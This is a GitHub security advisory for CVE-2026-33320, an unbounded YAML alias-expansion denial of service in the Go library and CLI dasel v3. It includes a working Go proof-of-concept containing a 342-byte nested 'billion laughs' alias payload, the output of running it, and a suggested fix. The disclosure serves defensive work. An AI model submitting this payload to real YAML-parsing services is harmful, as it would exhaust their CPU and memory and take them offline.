# [M] Dasel has unbounded YAML alias expansion in dasel leads to CPU/memory denial of service

## Summary
Severity: Medium
Advisory: GHSA-4fcp-jxh7-23x8
CVE: CVE-2026-33320
CWE: CWE-674
Ecosystem: Go
CVSS: CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-03-19
Source: https://github.com/advisories/GHSA-4fcp-jxh7-23x8
Type: github-advisory

## Affected
- Go: `github.com/tomwright/dasel/v3` — affected >=3.0.0 <3.3.2

## Details
### Summary

`dasel`'s YAML reader allows an attacker who can supply YAML for processing to trigger extreme CPU and memory consumption. The issue is in the library's own `UnmarshalYAML` implementation, which manually resolves alias nodes by recursively following `yaml.Node.Alias` pointers without any expansion budget, bypassing go-yaml v4's built-in alias expansion limit.

The issue issue is on `v3.3.1` (`fba653c7f248aff10f2b89fca93929b64707dfc8`) and on the current default branch at commit `0dd6132e0c58edbd9b1a5f7ffd00dfab1e6085ad`. It is also verified the same code path is present in `v3.0.0` (`648f83baf070d9e00db8ff312febef857ec090a3`). A 342-byte payload did not complete within 5 seconds on the test system and exhibited unbounded resource growth.

### Details

In `v3.3.1` (`fba653c7f248aff10f2b89fca93929b64707dfc8`), the reachable call path is:

- The YAML reader is registered in [`parsing/yaml/yaml.go`](https://github.com/TomWright/dasel/blob/fba653c7f248aff10f2b89fca93929b64707dfc8/parsing/yaml/yaml.go) and exposed via `parsing.Format("yaml").NewReader()`
- `(*yamlReader).Read` in [`parsing/yaml/yaml_reader.go#L23-L48`](https://github.com/TomWright/dasel/blob/fba653c7f248aff10f2b89fca93929b64707dfc8/parsing/yaml/yaml_reader.go#L23-L48) uses `yaml.NewDecoder` to decode the input. Because `yamlValue` implements `UnmarshalYAML(*yaml.Node)`, the decoder passes the raw `*yaml.Node` tree to that custom unmarshaler
- `(*yamlValue).UnmarshalYAML` in [`parsing/yaml/yaml_reader.go#L57-L131`](https://github.com/TomWright/dasel/blob/fba653c7f248aff10f2b89fca93929b64707dfc8/parsing/yaml/yaml_reader.go#L57-L131) walks the Node tree
- When an `AliasNode` is encountered, the handler at [`parsing/yaml/yaml_reader.go#L119-L126`](https://github.com/TomWright/dasel/blob/fba653c7f248aff10f2b89fca93929b64707dfc8/parsing/yaml/yaml_reader.go#L119-L126) recursively calls `newVal.UnmarshalYAML(value.Alias)` without tracking expansion count

The root cause is that go-yaml v4 has two decoding paths:

1. **`Unmarshal` into Go values**: Tracks alias expansion count and rejects documents with excessive aliasing (`"yaml: document contains excessive aliasing"`).
2. **`Decode` into `yaml.Node` / custom `UnmarshalYAML`**: Passes a compact Node tree where alias nodes are pointers to their anchors. No expansion occurs at this level.

Dasel receives the compact Node tree via its `UnmarshalYAML(*yaml.Node)` hook and then recursively follows `value.Alias` pointers, re-expanding aliases without a budget:

```go
case yaml.AliasNode:
    newVal := &yamlValue{}
    if err := newVal.UnmarshalYAML(value.Alias); err != nil {
        return err
    }
    yv.value = newVal.value
    yv.value.SetMetadataValue("yaml-alias", value.Value)
```

With a 9-level alias bomb (each level referencing the previous 9 times), this produces hundreds of millions of recursive expansions from a 342-byte input.

Test environment:

- MacBook Air (Apple M2), macOS / Darwin `arm64`
- Go `1.26.1`
- dasel `v3.3.1` (`fba653c7f248aff10f2b89fca93929b64707dfc8`)
- go.yaml.in/yaml/v4 `v4.0.0-rc.3`

### PoC

```go
package main

import (
	"fmt"
	"runtime"
	"time"

	"github.com/tomwright/dasel/v3/parsing"
	_ "github.com/tomwright/dasel/v3/parsing/yaml"
	"go.yaml.in/yaml/v4"
)

func main() {
	payload := `a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
`

	fmt.Printf("Payload size: %d bytes\n", len(payload))
	fmt.Printf("Go version: %s\n", runtime.Version())
	fmt.Printf("GOARCH: %s\n", runtime.GOARCH)
	fmt.Println()

	// 1. go-yaml v4 Unmarshal correctly rejects this
	fmt.Println("=== Test 1: Direct yaml.Unmarshal (should be rejected) ===")
	{
		var v interface{}
		start := time.Now()
		err := yaml.Unmarshal([]byte(payload), &v)
		elapsed := time.Since(start)
		if err != nil {
			fmt.Printf("SAFE: Rejected in %v: %v\n", elapsed, err)
		} else {
			fmt.Printf("VULNERABLE: Completed in %v\n", elapsed)
		}
	}
	fmt.Println()

	// 2. Dasel's YAML reader is vulnerable
	fmt.Println("=== Test 2: Dasel YAML reader (VULNERABLE) ===")
	done := make(chan string, 1)
	go func() {
		reader, err := parsing.Format("yaml").NewReader(parsing.DefaultReaderOptions())
		if err != nil {
			done <- fmt.Sprintf("Error creating reader: %v", err)
			return
		}
		start := time.Now()
		_, err = reader.Read([]byte(payload))
		elapsed := time.Since(start)
		if err != nil {
			done <- fmt.Sprintf("Error after %v: %v", elapsed, err)
		} else {
			done <- fmt.Sprintf("Completed in %v", elapsed)
		}
	}()

	select {
	case result := <-done:
		fmt.Println(result)
	case <-time.After(5 * time.Second):
		fmt.Println("CONFIRMED: did not complete within 5s; unbounded alias expansion in progress")
	}
}
```

Observed output on `v3.3.1` in the test environment above:

```text
Payload size: 342 bytes
Go version: go1.26.1
GOARCH: arm64

=== Test 1: Direct yaml.Unmarshal (should be rejected) ===
SAFE: Rejected in 824.042µs: yaml: document contains excessive aliasing

=== Test 2: Dasel YAML reader (VULNERABLE) ===
CONFIRMED: did not complete within 5s; unbounded alias expansion in progress
```

### Impact

An attacker who can supply YAML for processing by dasel can cause denial of service. The library's own `UnmarshalYAML` handler triggers unbounded recursive alias expansion from a 342-byte input. The process consumes 100% CPU and exhibits growing memory usage until externally terminated.

This affects:
- CLI usage: when reading YAML from stdin or files via the CLI
- Library usage: any application using dasel's YAML reader to parse untrusted YAML
- The `parse("yaml", ...)` function in selectors

### Suggested Fix

One likely fix is to add an alias expansion counter to `UnmarshalYAML` that limits the total number of alias resolutions, similar to go-yaml v4's internal limit. For example, track a counter across all recursive calls and return an error when it exceeds a threshold (e.g., 1,000,000 expansions).

## References
- https://github.com/TomWright/dasel/security/advisories/GHSA-4fcp-jxh7-23x8
- https://nvd.nist.gov/vuln/detail/CVE-2026-33320
- https://github.com/TomWright/dasel
